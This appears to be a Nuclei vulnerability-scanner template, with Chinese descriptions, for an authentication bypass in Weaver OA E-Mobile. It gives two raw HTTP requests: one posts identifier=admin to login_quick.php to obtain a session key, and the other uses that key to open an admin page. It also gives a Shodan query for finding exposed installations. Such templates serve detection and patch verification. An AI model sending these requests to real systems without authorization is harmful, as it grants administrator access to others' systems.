id: weaver-login-sessionkey

info:
  name: OA E-Mobile login_quick.php - Login SessionKey
  author: SleepingBag945
  severity: high
  description: |
    该模板用于检测 OA E-Mobile login_quick.php - Login SessionKey。该问题通常源于受影响接口或组件缺少必要的输入校验、访问控制或安全边界限制。模板会向 `/E-mobile/App/System/Login/login_quick.php`、`/E-mobile/App/Init.php?m=all_Create&detailid=&fromid=&sessionkey={{timestamp}}` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能利用该缺陷访问敏感功能、读取或篡改数据，或扩大对目标系统的控制范围。
    - 在公网暴露、权限配置过宽或与其他缺陷组合时，可能造成更严重的业务中断和数据泄露。
  remediation: |
    - 升级受影响产品或组件到厂商修复版本，并移除不再维护的高风险功能。
    - 对相关接口增加认证、授权、输入校验和访问来源限制。
    - 复核访问日志和异常操作记录，确认是否存在已被利用的迹象。
  metadata:
    max-request: 2
    shodan-query: http.html:"E-Mobile"
  tags: weaver,e-mobile,oa,vuln

http:
  - raw:
      - |
        POST /E-mobile/App/System/Login/login_quick.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        identifier=admin
      - |
        GET /E-mobile/App/Init.php?m=all_Create&detailid=&fromid=&sessionkey={{timestamp}} HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: timestamp
        internal: true
        group: 1
        regex:
          - '\"sessionkey\":\"(.*?)\"'

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && contains(body_1,'{{timestamp}}')"
          - "status_code_2 == 200 && contains(body_2,'<title>新建')"
        condition: and
